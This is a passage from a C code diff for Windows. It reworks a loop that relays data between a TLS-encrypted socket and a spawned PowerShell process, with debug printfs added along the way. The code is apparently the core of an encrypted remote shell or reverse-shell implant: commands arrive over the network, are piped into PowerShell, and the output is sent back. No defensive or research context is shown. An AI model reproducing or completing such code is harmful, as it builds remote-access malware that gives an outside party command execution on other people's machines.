+        printf("ABOUT TO RUN TLSRECV\n");
+        DWORD got = TlsRecv(sock, &cred, &ctx, buf, BUFSZ);
+        printf("GOT PAST RECV GOT %d\n", got);
+        if (got == 0) {
+            continue;
+        }
 
-    // 3) pump data between TLS socket and PowerShell
-    #define BUF_SIZE 4096
-    for (;;)
-    {
-        // 3a) read from TLS → write to child stdin
-        char inbuf[BUF_SIZE];
-        int inlen = tls_read(&s, inbuf, sizeof(inbuf));
-        if (inlen <= 0) break;  // disconnect or error
         DWORD written;
-        if (!WriteFile(hChildStdinWr, inbuf, inlen, &written, NULL)) break;
+        WriteFile(inWr, buf, got, &written, NULL);
 
-        // 3b) read from child stdout → write to TLS
-        char outbuf[BUF_SIZE];
-        DWORD avail = 0;
-        if (!PeekNamedPipe(hChildStdoutRd, NULL, 0, NULL, &avail, NULL) || avail == 0)
-        {
-            // no data immediately available: small sleep to avoid busy‑loop
-            Sleep(10);
+        DWORD avail;
+        if (PeekNamedPipe(outRd, NULL,0,NULL,&avail,NULL) && avail) {
+            BYTE tmp[BUFSZ];
+            ReadFile(outRd, tmp, min(avail,BUFSZ), &written, NULL);
+            TlsSend(sock, &cred, &ctx, tmp, written);
         }
-        else
-        {
-            if (ReadFile(hChildStdoutRd, outbuf, min(inlen, BUF_SIZE), &written, NULL) && written > 0)
-            {
-                if (tls_write(&s, outbuf, written) != 0) break;
-            }
-        }
+        //Sleep(10);
     }
 
-    // 4) clean up
     TerminateProcess(pi.hProcess, 0);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    CloseHandle(hChildStdinWr);
-    CloseHandle(hChildStdoutRd);
+    CloseHandle(inWr);
+    CloseHandle(outRd);
 
-    tls_disconnect(&s);
-     return 0;
+    TlsClose(sock, &ctx);
+    return 0;
 }
